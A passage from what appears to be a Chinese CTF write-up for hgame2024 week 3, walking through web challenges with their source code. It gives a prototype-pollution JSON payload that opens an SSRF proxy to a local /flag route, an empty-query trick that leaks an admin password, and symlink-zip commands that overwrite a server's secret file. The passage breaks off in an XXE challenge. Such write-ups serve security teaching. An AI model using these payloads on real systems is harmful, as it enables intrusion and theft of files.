class="subst">$&#123;port&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>观察这个函数</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 原型链污染 ，过滤 __</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">update</span>(<span class="params">dst, src</span>) &#123;</span><br><span class="line">  <span class="keyword">for</span> (key <span class="keyword">in</span> src) &#123;</span><br><span class="line">    <span class="keyword">if</span> (key.<span class="title function_">indexOf</span>(<span class="string">&quot;__&quot;</span>) != -<span class="number">1</span>) &#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> src[key] == <span class="string">&quot;object&quot;</span> &amp;&amp; dst[key] !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">      <span class="title function_">update</span>(dst[key], src[key]);</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    dst[key] = src[key];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是一个原型链污染的函数，过滤了 <code>__</code> ，不能使用 <code>__proto__</code></p><p>可以用 <code>constructor.prototype</code> 代替<code>__proto__</code></p><p>找一下那里调用了这个函数</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// under development</span></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/user/info&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">username</span>) &#123;</span><br><span class="line">    res.<span class="title function_">sendStatus</span>(<span class="number">403</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">update</span>(userStorage[req.<span class="property">session</span>.<span class="property">username</span>].<span class="property">info</span>, req.<span class="property">body</span>);</span><br><span class="line">  res.<span class="title function_">sendStatus</span>(<span class="number">200</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>这个路由调用了<code>update</code>函数，可以原型链污染。</p><p>找一下触发flag的条件，知道需要污染什么</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">use</span>(<span class="string">&quot;/proxy&quot;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; username &#125; = req.<span class="property">session</span>;</span><br><span class="line">  <span class="keyword">if</span> (!username) &#123;</span><br><span class="line">    res.<span class="title function_">sendStatus</span>(<span class="number">403</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> url = (<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="title function_">URL</span>(req.<span class="property">query</span>.<span class="property">url</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">      res.<span class="title function_">status</span>(<span class="number">400</span>);</span><br><span class="line">      res.<span class="title function_">end</span>(<span class="string">&quot;invalid url.&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">undefined</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!url) <span class="keyword">return</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(url.<span class="property">hostname</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(username);</span><br><span class="line">  <span class="keyword">if</span> (!userStorage[username].<span class="property">strategy</span>[url.<span class="property">hostname</span>]) &#123;</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">400</span>);</span><br><span class="line">    res.<span class="title function_">end</span>(<span class="string">&quot;your url is not allowed.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> headers = req.<span class="property">headers</span>;</span><br><span class="line">    headers.<span class="property">host</span> = url.<span class="property">host</span>;</span><br><span class="line">    headers.<span class="property">cookie</span> = headers.<span class="property">cookie</span>.<span class="title function_">split</span>(<span class="string">&quot;;&quot;</span>).<span class="title function_">forEach</span>(<span class="function">(<span class="params">cookie</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">var</span> filtered_cookie = <span class="string">&quot;&quot;</span>;</span><br><span class="line">      <span class="keyword">const</span> [key, value] = cookie.<span class="title function_">split</span>(<span class="string">&quot;=&quot;</span>, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (key.<span class="title function_">trim</span>() !== session_name) &#123;</span><br><span class="line">        filtered_cookie += <span class="string">`<span class="subst">$&#123;key&#125;</span>=<span class="subst">$&#123;value&#125;</span>;`</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> filtered_cookie;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">const</span> remote_res = <span class="keyword">await</span> (<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (req.<span class="property">method</span> == <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> axios.<span class="title function_">post</span>(url, req.<span class="property">body</span>, &#123;</span><br><span class="line">          <span class="attr">headers</span>: headers,</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (req.<span class="property">method</span> == <span class="string">&quot;GET&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> axios.<span class="title function_">get</span>(url, &#123;</span><br><span class="line">          <span class="attr">headers</span>: headers,</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">405</span>);</span><br><span class="line">        res.<span class="title function_">end</span>(<span class="string">&quot;method not allowed.&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)();</span><br><span class="line">    res.<span class="title function_">status</span>(remote_res.<span class="property">status</span>);</span><br><span class="line">    res.<span class="title function_">header</span>(remote_res.<span class="property">headers</span>);</span><br><span class="line">    res.<span class="title function_">write</span>(remote_res.<span class="property">data</span>);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">500</span>);</span><br><span class="line">    res.<span class="title function_">end</span>(<span class="string">&quot;unreachable url.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// demo service behind webvpn</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/flag&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (</span><br><span class="line">    req.<span class="property">headers</span>.<span class="property">host</span> != <span class="string">&quot;127.0.0.1:3000&quot;</span> ||</span><br><span class="line">    req.<span class="property">hostname</span> != <span class="string">&quot;127.0.0.1&quot;</span> ||</span><br><span class="line">    req.<span class="property">ip</span> != <span class="string">&quot;127.0.0.1&quot;</span> </span><br><span class="line">  ) &#123;</span><br><span class="line">    res.<span class="title function_">sendStatus</span>(<span class="number">400</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> data = fs.<span class="title function_">readFileSync</span>(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line">  res.<span class="title function_">send</span>(data);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>可以知道我们需要通过<code>/proxy</code>路由访问<code>http://127.0.0.1:3000/flag</code>才能得到flag。</p><p>分析一下<code>/proxy</code>路由</p><p>传入一个<code>url</code>的参数，里面填上需要访问的网站，然后检查这个网站是不是允许访问的，是的话就访问，不是就返回<code>your url is not allowed.</code>。</p><p>接下来就是需要污染了，我们需要把<code>127.0.0.1</code>污染成允许访问，因为默认是没有的。</p><p>本地测试代码：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> userStorage = &#123;</span><br><span class="line">  <span class="attr">username</span>: &#123;</span><br><span class="line">    <span class="attr">password</span>: <span class="string">&quot;password&quot;</span>,</span><br><span class="line">    <span class="attr">info</span>: &#123;</span><br><span class="line">      <span class="attr">age</span>: <span class="number">18</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">strategy</span>: &#123;</span><br><span class="line">      <span class="string">&quot;baidu.com&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="string">&quot;google.com&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">update</span>(<span class="params">dst, src</span>) &#123;</span><br><span class="line">  <span class="keyword">for</span> (key <span class="keyword">in</span> src) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> src[key] == <span class="string">&quot;object&quot;</span> &amp;&amp; dst[key] !== <span class="literal">undefined</span>) &#123;</span><br><span class="line"><span class="comment">//console.log(src[key]);</span></span><br><span class="line">      <span class="title function_">update</span>(dst[key], src[key]);</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//console.log(dst);</span></span><br><span class="line">    dst[key] = src[key];</span><br><span class="line"><span class="comment">//console.log(dst[key]);</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> url = <span class="keyword">new</span> <span class="title function_">URL</span>(<span class="string">&quot;http://127.0.0.1:3000/flag&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> o2 =  <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;age&quot;:33,&quot;constructor&quot;:&#123;&quot;prototype&quot;:&#123;&quot;127.0.0.1&quot;:true&#125;&#125;&#125;&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//console.log(url.hostname);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//console.log(o2);</span></span><br><span class="line"><span class="comment">//console.log(userStorage);</span></span><br><span class="line"></span><br><span class="line"><span class="title function_">update</span>(userStorage[<span class="string">&quot;username&quot;</span>].<span class="property">info</span>, o2);</span><br><span class="line"></span><br><span class="line"><span class="comment">//console.log(userStorage[&quot;username&quot;].strategy.test);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//console.log(userStorage[&#x27;username&#x27;].strategy[&quot;127.0.0.1&quot;]);</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(userStorage[<span class="string">&#x27;username&#x27;</span>].<span class="property">strategy</span>[url.<span class="property">hostname</span>]);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>由此可以确定我们在<code>/user/info</code>路由传入的数据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;age&quot;:33,&quot;constructor&quot;:&#123;&quot;prototype&quot;:&#123;&quot;127.0.0.1&quot;:true&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/./hgame2024_week3/w_1_2.png"></p><p>污染成功后，通过<code>/proxy</code>路由访问<code>http://127.0.0.1:3000/flag</code>即可得到flag。</p><p><img src="/./hgame2024_week3/w_1_1.png"></p><h2 id="Zero-Link"><a href="#Zero-Link" class="headerlink" title="Zero Link"></a>Zero Link</h2><p>部分源码:</p><p><strong>routes.go</strong></p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> routes</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;html/template&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line"><span class="string">&quot;os/signal&quot;</span></span><br><span class="line"><span class="string">&quot;path/filepath&quot;</span></span><br><span class="line"><span class="string">&quot;zero-link/internal/config&quot;</span></span><br><span class="line"><span class="string">&quot;zero-link/internal/controller/auth&quot;</span></span><br><span class="line"><span class="string">&quot;zero-link/internal/controller/file&quot;</span></span><br><span class="line"><span class="string">&quot;zero-link/internal/controller/ping&quot;</span></span><br><span class="line"><span class="string">&quot;zero-link/internal/controller/user&quot;</span></span><br><span class="line"><span class="string">&quot;zero-link/internal/middleware&quot;</span></span><br><span class="line"><span class="string">&quot;zero-link/internal/views&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;github.com/gin-contrib/sessions&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gin-contrib/sessions/cookie&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Run</span><span class="params">()</span></span> &#123;</span><br><span class="line">r := gin.Default()</span><br><span class="line"></span><br><span class="line">html := template.Must(template.New(<span class="string">&quot;&quot;</span>).ParseFS(views.FS, <span class="string">&quot;*&quot;</span>))</span><br><span class="line">r.SetHTMLTemplate(html)</span><br><span class="line"></span><br><span class="line">secret := config.Secret.SessionSecret</span><br><span class="line">store := cookie.NewStore([]<span class="type">byte</span>(secret))</span><br><span class="line">r.Use(sessions.Sessions(<span class="string">&quot;session&quot;</span>, store))</span><br><span class="line"></span><br><span class="line">api := r.Group(<span class="string">&quot;/api&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">api.GET(<span class="string">&quot;/ping&quot;</span>, ping.Ping)</span><br><span class="line">api.POST(<span class="string">&quot;/user&quot;</span>, user.GetUserInfo)</span><br><span class="line">api.POST(<span class="string">&quot;/login&quot;</span>, auth.AdminLogin)</span><br><span class="line"></span><br><span class="line">apiAuth := api.Group(<span class="string">&quot;&quot;</span>)</span><br><span class="line">apiAuth.Use(middleware.Auth())</span><br><span class="line">&#123;</span><br><span class="line">apiAuth.POST(<span class="string">&quot;/upload&quot;</span>, file.UploadFile)</span><br><span class="line">apiAuth.GET(<span class="string">&quot;/unzip&quot;</span>, file.UnzipPackage)</span><br><span class="line">apiAuth.GET(<span class="string">&quot;/secret&quot;</span>, file.ReadSecretFile)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">frontend := r.Group(<span class="string">&quot;/&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">frontend.GET(<span class="string">&quot;/&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">c.HTML(http.StatusOK, <span class="string">&quot;index.html&quot;</span>, <span class="literal">nil</span>)</span><br><span class="line">&#125;)</span><br><span class="line">frontend.GET(<span class="string">&quot;/login&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">c.HTML(http.StatusOK, <span class="string">&quot;login.html&quot;</span>, <span class="literal">nil</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">frontendAuth := frontend.Group(<span class="string">&quot;&quot;</span>)</span><br><span class="line">frontendAuth.Use(middleware.Auth())</span><br><span class="line">&#123;</span><br><span class="line">frontendAuth.GET(<span class="string">&quot;/manager&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">c.HTML(http.StatusOK, <span class="string">&quot;manager.html&quot;</span>, <span class="literal">nil</span>)</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">quit := <span class="built_in">make</span>(<span class="keyword">chan</span> os.Signal)</span><br><span class="line">signal.Notify(quit, os.Interrupt)</span><br><span class="line"></span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">&lt;-quit</span><br><span class="line">err := os.Remove(filepath.Join(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;sqlite.db&quot;</span>))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;Failed to delete sqlite.db:&quot;</span>, err)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;sqlite.db deleted&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">os.Exit(<span class="number">0</span>)</span><br><span class="line">&#125;()</span><br><span class="line"></span><br><span class="line">r.Run(<span class="string">&quot;:8000&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>通过这里确定路由，接着是登录，我们需要找到<code>Admin</code> 的密码。</p><p>在<code>/api/user</code>路由能够查询用户，限制了<code>Username != &quot;Admin&quot;</code>和 <code>Token != &quot;0000&quot;</code>。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GetUserByUsernameOrToken</span><span class="params">(username <span class="type">string</span>, token <span class="type">string</span>)</span></span> (*User, <span class="type">error</span>) &#123;</span><br><span class="line"><span class="keyword">var</span> user User</span><br><span class="line">query := db</span><br><span class="line"><span class="keyword">if</span> username != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">query = query.Where(&amp;User&#123;Username: username&#125;)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">query = query.Where(&amp;User&#123;Token: token&#125;)</span><br><span class="line">&#125;</span><br><span class="line">err := query.First(&amp;user).Error</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Println(<span class="string">&quot;Cannot get user: &quot;</span> + err.Error())</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> &amp;user, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要查询函数是这个，通过传入空的<code>username</code>和<code>token</code>可以得到<code>Admin</code>的密码为 <code>Zb77jbeoZkDdfQ12fzb0</code>。</p><p><img src="/./hgame2024_week3/w_2_1.png"></p><p>接着来到上传页面，查看<code>file.go</code>的代码</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> file</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line"><span class="string">&quot;os/exec&quot;</span></span><br><span class="line"><span class="string">&quot;path/filepath&quot;</span></span><br><span class="line"><span class="string">&quot;zero-link/internal/util&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> FileResponse <span class="keyword">struct</span> &#123;</span><br><span class="line">Code    <span class="type">int</span>    <span class="string">`json:&quot;code&quot;`</span></span><br><span class="line">Message <span class="type">string</span> <span class="string">`json:&quot;message&quot;`</span></span><br><span class="line">Data    <span class="type">string</span> <span class="string">`json:&quot;data&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">UploadFile</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">file, err := c.FormFile(<span class="string">&quot;file&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(http.StatusBadRequest, FileResponse&#123;</span><br><span class="line">Code:    http.StatusBadRequest,</span><br><span class="line">Message: <span class="string">&quot;No file uploaded&quot;</span>,</span><br><span class="line">Data:    <span class="string">&quot;&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ext := filepath.Ext(file.Filename)</span><br><span class="line"><span class="keyword">if</span> (ext != <span class="string">&quot;.zip&quot;</span>) || (file.Header.Get(<span class="string">&quot;Content-Type&quot;</span>) != <span class="string">&quot;application/zip&quot;</span>) &#123;</span><br><span class="line">c.JSON(http.StatusBadRequest, FileResponse&#123;</span><br><span class="line">Code:    http.StatusBadRequest,</span><br><span class="line">Message: <span class="string">&quot;Only .zip files are allowed&quot;</span>,</span><br><span class="line">Data:    <span class="string">&quot;&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">filename := <span class="string">&quot;/app/uploads/&quot;</span> + file.Filename</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> _, err := os.Stat(filename); err == <span class="literal">nil</span> &#123;</span><br><span class="line">err := os.Remove(filename)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(http.StatusInternalServerError, FileResponse&#123;</span><br><span class="line">Code:    http.StatusInternalServerError,</span><br><span class="line">Message: <span class="string">&quot;Failed to remove existing file&quot;</span>,</span><br><span class="line">Data:    <span class="string">&quot;&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">err = c.SaveUploadedFile(file, filename)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(http.StatusInternalServerError, FileResponse&#123;</span><br><span class="line">Code:    http.StatusInternalServerError,</span><br><span class="line">Message: <span class="string">&quot;Failed to save file&quot;</span>,</span><br><span class="line">Data:    <span class="string">&quot;&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">c.JSON(http.StatusOK, FileResponse&#123;</span><br><span class="line">Code:    http.StatusOK,</span><br><span class="line">Message: <span class="string">&quot;File uploaded successfully&quot;</span>,</span><br><span class="line">Data:    filename,</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">UnzipPackage</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">files, err := filepath.Glob(<span class="string">&quot;/app/uploads/*.zip&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(http.StatusInternalServerError, FileResponse&#123;</span><br><span class="line">Code:    http.StatusInternalServerError,</span><br><span class="line">Message: <span class="string">&quot;Failed to get list of .zip files&quot;</span>,</span><br><span class="line">Data:    <span class="string">&quot;&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _, file := <span class="keyword">range</span> files &#123;</span><br><span class="line">cmd := exec.Command(<span class="string">&quot;unzip&quot;</span>, <span class="string">&quot;-o&quot;</span>, file, <span class="string">&quot;-d&quot;</span>, <span class="string">&quot;/tmp/&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err := cmd.Run(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(http.StatusInternalServerError, FileResponse&#123;</span><br><span class="line">Code:    http.StatusInternalServerError,</span><br><span class="line">Message: <span class="string">&quot;Failed to unzip file: &quot;</span> + file,</span><br><span class="line">Data:    <span class="string">&quot;&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">c.JSON(http.StatusOK, FileResponse&#123;</span><br><span class="line">Code:    http.StatusOK,</span><br><span class="line">Message: <span class="string">&quot;Unzip completed&quot;</span>,</span><br><span class="line">Data:    <span class="string">&quot;&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ReadSecretFile</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">secretFilepath := <span class="string">&quot;/app/secret&quot;</span></span><br><span class="line">content, err := util.ReadFileToString(secretFilepath)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(http.StatusInternalServerError, FileResponse&#123;</span><br><span class="line">Code:    http.StatusInternalServerError,</span><br><span class="line">Message: <span class="string">&quot;Failed to read secret file&quot;</span>,</span><br><span class="line">Data:    <span class="string">&quot;&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">secretContent, err := util.ReadFileToString(content)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(http.StatusInternalServerError, FileResponse&#123;</span><br><span class="line">Code:    http.StatusInternalServerError,</span><br><span class="line">Message: <span class="string">&quot;Failed to read secret file content&quot;</span>,</span><br><span class="line">Data:    <span class="string">&quot;&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">c.JSON(http.StatusOK, FileResponse&#123;</span><br><span class="line">Code:    http.StatusOK,</span><br><span class="line">Message: <span class="string">&quot;Secret content read successfully&quot;</span>,</span><br><span class="line">Data:    secretContent,</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>/api/upload</code>路由只能上传<code>zip</code>文件。</p><p><code>/api/unzip</code>路由是用<code>unzip</code>将上传的<code>zip</code>文件解压，把文件解压到<code>/tmp/</code>。</p><p><code>/api/secret</code>路由是读<code>/app/secret</code>文件的内容。</p><p>这里参考ciscn的<code>unzip</code>，参考链接：<a href="https://www.cnblogs.com/gxngxngxn/p/17439035.html">【CISCN2023】unzip 详解</a></p><p>通过软链接把<code>/app</code>文件夹链接到<code>web</code>文件夹，然后解压到<code>/tmp</code>，之后再把新的<code>secret</code>解压到<code>web</code>，因为<code>web</code>文件夹是<code>/app</code>文件夹的软链接，解压到<code>web</code>文件夹等同于解压到<code>/app</code>文件夹，从而用新的<code>secret</code>覆盖掉旧的<code>secret</code>。</p><p>文件生成，需要保证根目录有<code>/app</code>文件夹</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ln</span> -s /app web          </span><br><span class="line"></span><br><span class="line">zip --symlinks aweb.zip web</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;/flag&quot;</span> &gt; web/secret</span><br><span class="line"></span><br><span class="line">zip -y web/secret flag.zip</span><br><span class="line"></span><br><span class="line">zip -y flag.zip web/secret </span><br></pre></td></tr></table></figure><p><img src="/./hgame2024_week3/w_2_2.png"></p><p>先上传<code>web.zip</code>再上传<code>flag.zip</code>，顺序不能反。</p><p>每上传完一个文件都要访问一下<code>/api/unzip</code>解压</p><p>解压完后访问<code>/api/secret</code>即可得到真正的flag。</p><p><img src="/./hgame2024_week3/w_2_3.png"></p><h2 id="VidarBox"><a href="#VidarBox" class="headerlink" title="VidarBox"></a>VidarBox</h2><p>参考链接：<a href="https://boogipop.com/2024/01/29/RealWorld%20CTF%206th%20%E6%AD%A3%E8%B5%9B_%E4%BD%93%E9%AA%8C%E8%B5%9B%20%E9%83%A8%E5%88%86%20Web%20Writeup/#chatterbox%EF%BC%88solved%EF%BC%89">RealWorld CTF 6th 正赛&#x2F;体验赛 部分 Web Writeup</a></p><p>​<a href="https://www.cnblogs.com/CxAgoni/p/17715330.html#entitysystemfile%E7%AD%89%E5%85%B3%E9%94%AE%E8%AF%8D%E8%A2%AB%E8%BF%87%E6%BB%A4"><a href="https://www.cnblogs.com/CxAgoni/p/17715330.html">XXE漏洞&amp;绕过</a></a></p><p>关键代码：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.vidar.controller;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.core.io.DefaultResourceLoader;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.xml.sax.InputSource;</span><br><span class="line"><span class="keyword">import</span> org.xml.sax.SAXException;</span><br><span class="line"><span class="keyword">import</span> org.xml.sax.XMLReader;</span><br><span class="line"><span class="keyword">import</span> org.xml.sax.helpers.XMLReaderFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BackdoorController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">workdir</span> <span class="operator">=</span> <span class="string">&quot;file:///non_exists/&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">suffix</span> <span class="operator">=</span> <span 